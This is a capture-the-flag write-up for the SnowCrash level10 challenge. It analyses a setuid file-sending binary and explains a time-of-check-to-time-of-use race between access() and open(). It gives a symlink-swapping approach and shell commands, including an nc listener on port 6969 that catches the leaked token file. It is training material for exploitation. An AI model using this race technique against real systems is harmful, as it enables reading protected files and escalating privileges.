# SnowCrash Level10

A simple strings would give us the following :
```
level10@SnowCrash:~$ strings level10
	[...]
	%s file host
	sends file to host if you have access to it
	Connecting to %s:6969 ..
	Unable to connect to host %s
	.*( )*.
	Unable to write banner to host %s
	Connected!
	Sending file ..
	Damn. Unable to open file
	Unable to read from file: %s
	wrote file!
	You don't have access to %s
	[...]
```

So basically the program tries to open a file and then send it.
Let's see functions using gdb.
```
level10@SnowCrash:~$ gdb level10
(gdb) info functions
	[...]
	0x080485e0  access
	[...]
```

After some long searching. I found out that access has a vulnerability.
TLDR: In the time between trying to access() and after. A small window opens to change the file.
It is known as Race Condition.
The way we can do it is as the following.
Have an infinite loop. Have a useless file. Symlink it to another file.
Delete that file and at the same time make a symlink to the token in the home directory.
Do it all over again in the loop.

In another terminal we run the level10 on that symlink we create. and we need to listen on port 6969.
Theorically we change the symlinked file in that brief moment after access so we can read what's on token.
It is known as well as Time To Check Time To Use aka toctou

So chall we ?
```
level10@SnowCrash:~$ touch uselss_file
level10@SnowCrash:~$ touch to_read
level10@SnowCrash:~$ sh exploit.sh(you will find it with this writeup.)
```

Then start listenning on port 6969
```
level10@SnowCrash:~$ nc -lk 6969 >> /tmp/level10/to_read
```

And now an infinite loop for our level10 binary.
```
level10@SnowCrash:~$ while true; do ./level10 /tmp/level10/symlink 127.0.0.1; done
```
